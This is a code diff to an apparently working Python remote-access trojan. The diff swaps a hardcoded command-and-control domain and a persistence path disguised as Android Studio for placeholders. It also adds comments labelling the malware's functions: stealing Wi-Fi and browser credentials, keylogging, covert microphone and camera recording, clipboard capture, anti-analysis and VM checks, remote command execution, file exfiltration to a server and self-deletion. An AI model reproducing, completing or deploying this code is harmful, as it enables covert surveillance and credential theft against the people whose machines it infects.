@@ -45,7 +45,7 @@ pem_public_key = public_key.public_bytes(
 
 peer_key = None
 
-
+# clean up residual files
 if platform.system().lower()=="windows":
     print(os.path.dirname(os.path.abspath(sys.argv[0])))
     if "rarsfx" in os.path.basename(os.path.dirname(os.path.abspath(sys.argv[0]))).lower():
@@ -74,7 +74,7 @@ class Agent:
                 import winreg
                 HKCU = winreg.HKEY_CURRENT_USER
                 startup = winreg.OpenKeyEx(HKCU, r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_SET_VALUE)
-                winreg.SetValueEx(startup, "android studio", 0, winreg.REG_SZ, "C:\Program Files\Android\Android Studio\bin\android studio.exe")
+                winreg.SetValueEx(startup, "<exe.name.here>", 0, winreg.REG_SZ, "<payload.path.here>")
                 winreg.CloseKey(startup)
             except Exception as e:
                 print(e)
@@ -100,10 +100,10 @@ class Agent:
         
         self.conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         try:
-            self.conn.connect(("domaintesting.org", 6969))
+            self.conn.connect(("<placeholder.your.domain.name>", 0000))
         except TimeoutError:
             try:
-                self.conn.connect(("domaintesting.org", 6969))
+                self.conn.connect(("<placeholder.your.domain.name>", 0000))
             except:
                 exit()
         except:
@@ -118,13 +118,14 @@ class Agent:
         self.frames = []
         self.scrc = False
         self.scrThread = None
-        self.script_path = "C:\Program Files\Android\Android Studio\bin\android studio.exe"
+        self.script_path = "<payload.path.here>"
   
-
+    # json encode before sending to server
     def serialize_send(self, data):
         json_data = json.dumps(data)
         self.conn.send(json_data.encode())
 
+    # verify complete json data, else keep listening
     def serialize_receive(self):
         json_data = b""
         while True:
@@ -149,6 +150,7 @@ class Agent:
         except Exception as e:
             return f"An error occurred: {e}"
 
+    # send to server, does error checking
     def send_file(self, url, path):
         try:
             if os.path.getsize(path) < 262144000:
@@ -163,6 +165,7 @@ class Agent:
         except Exception as e:
             return f"An error occurred: {e}"
 
+    # upload file from server
     def receive_file(self, url, path):
         try: 
             data = get(url)
@@ -184,7 +187,8 @@ class Agent:
             return base64.b64encode(img).decode('ascii')
         except Exception as e:
             return None
-        
+    
+    # cv2, take a camera photo   
     def on_cam(self):
         try:
             vc = VideoCapture(0)
@@ -200,7 +204,8 @@ class Agent:
 
         except Exception as e:
             return None
-        
+    
+    # steal wifi creds
     def sww(self, command):
         try:
             wifiNetworks = []
@@ -220,7 +225,8 @@ class Agent:
             return output
         except Exception as e:
             return f"An error occurred: {e}"
-        
+    
+    # steal browser creds
     def sbc(self, path1, path2, F2xM7T1Q9P4rL8yJ0V5N6K3B, N9xL2T1Q4rP8mK5yJ0V7F3B6x):
         try:
             USERDIR = os.getenv('USERPROFILE')
@@ -245,7 +251,8 @@ class Agent:
             return [secretKey, loginData]
         except Exception as e:
             return f"An error occurred: {e}"
-        
+    
+    # start keylogger
     def bkl(self):
         if not self.keylog_active:
             self.keylog_active = True
@@ -267,7 +274,8 @@ class Agent:
             return "Q1xM4T2L9P7rK5yJ3V6F0N8xBL3T5xQ9rM1P"
         else:
             return "8w2JF98x"
-        
+    
+    # stop keylogger
     def stkl(self):
         if self.keylog_active:
             self.keylog_active = False
@@ -278,6 +286,7 @@ class Agent:
         else:
             return "M4T9P7yL2K5V"
     
+    # get keylogs (have to manually call)
     def gkl(self):
         if self.keylog_data:
             self.keylog_stop_time = datetime.now()
@@ -285,7 +294,8 @@ class Agent:
             return [self.keylog_data, self.keylog_start_time.strftime('%Y-%m-%d %H:%M:%S'), self.keylog_stop_time.strftime('%Y-%m-%d %H:%M:%S')]
         else:
             return None
-        
+    
+    # voice recording
     def svc(self):
         if not self.is_recording:
             self.audio = pyaudio.PyAudio()
@@ -300,7 +310,8 @@ class Agent:
             return "J9xT1rM4L8P2wK7V3yF0Q5N6xR"
         else:
             return "K4T9rL1Q2xM7P8yJ3V5F0N6xB"
-        
+    
+    # stop voice recording
     def spvc(self):
         if self.is_recording:
             self.stream.stop_stream()
@@ -327,13 +338,15 @@ class Agent:
         else:
             return None
 
+    # remove agent
     def destroy(self): #add this function
         try:
             os.remove(self.script_path)
             return "X7pL3mQ9rT2V5yJ8K1wF4N6xR0B"
         except Exception as e:
             return f"An error occurred: {e}"
-        
+    
+    # turn on camera and record, sends back recording when 25mb cap is hit
     def scr(self, R5L7T2xQ9mP4wK1yV8J3F0N6xB):
         self.scrc = True
         try:
@@ -378,7 +391,8 @@ class Agent:
                     response = post(R5L7T2xQ9mP4wK1yV8J3F0N6xB, files={"file":memoryFile.getvalue()}, headers={"X-Forwarded-Host": self.hostname})
             except Exception as e:
                 pass
-
+    
+    # get basic info of the target
     def get_system_info(self):
         try:
             try:
@@ -405,7 +419,8 @@ class Agent:
             return info
         except Exception as e:
             return str(e)
-        
+    
+    # scan for analysis tools processes
     def scan_processes(self):
         try:
             जिसमें字を含세계む長いчн = ["vmsrvc.exe", "vmusrvc.exe", "tcpview.exe", "wireshark.exe", "fiddler.exe", "vboxservice.exe", "vboxtray.exe", "procmon.exe", "procmon64.exe", "procexp.exe", "procexp64.exe", "regshot-x64-unicode.exe", "regshot-x64-ansi.exe", "processhacker.exe", "procdot.exe", "filegrab.exe"]
@@ -415,7 +430,8 @@ class Agent:
             return False
         except Exception as e:
             return f"An error occurred: {e}"
-        
+    
+    # check for virtualisation env (CPU & ram)
     def is_vm(self):
         try:
             if psutil.virtual_memory().total < 2 * 1024**3:  # Less than 2 GB RAM
@@ -434,7 +450,8 @@ class Agent:
             return False
         except:
             return False
-        
+    
+    # monitor resource usage (?)
     def monitor_system_performance(self):
         try:
             cpu_usage = psutil.cpu_percent(interval=1)
@@ -451,14 +468,16 @@ class Agent:
             return f"[+] Victim Machine: {performance_data}"
         except Exception as e:
             return f"An error occurred: {e}"
-        
+    
+    # copy whatever the target copies 
     def capture_clipboard(self):
         try:
             clipboard_content = pyperclip.paste()
             return clipboard_content
         except Exception as e:
             return f"An error occurred: {e}"
-        
+    
+    
     def file_hash(self):
         self.script_path = os.path.abspath(sys.argv[0])
         sha256 = hashlib.sha256()
@@ -479,6 +498,7 @@ class Agent:
             return f"An error occurred: {e}"
 
     def listen(self):
+        # handles server commands based on data type
         while True:
             command = self.serialize_receive()
             if len(command) == 8:
@@ -588,9 +608,12 @@ class Agent:
                 else:
                     output = self.exec(command)
                 max_chunk_size = 190
+                
+                # for command execution 
                 if output is None:
                     self.serialize_send(output)
                 else:
+                    # run when something needs to be sent back to server
                     output = json.dumps(output)
                     output = output.encode()
                     if len(output) > max_chunk_size:
@@ -608,6 +631,7 @@ class Agent:
                             encrypted_output.append(base64.b64encode(encrypted_chunk).decode('utf-8'))
                         self.serialize_send(encrypted_output)
                     else:
+                        # if data is small enough to be sent back ()
                         encrypted_output = peer_key.encrypt(
                             output,
                             padding.OAEP(
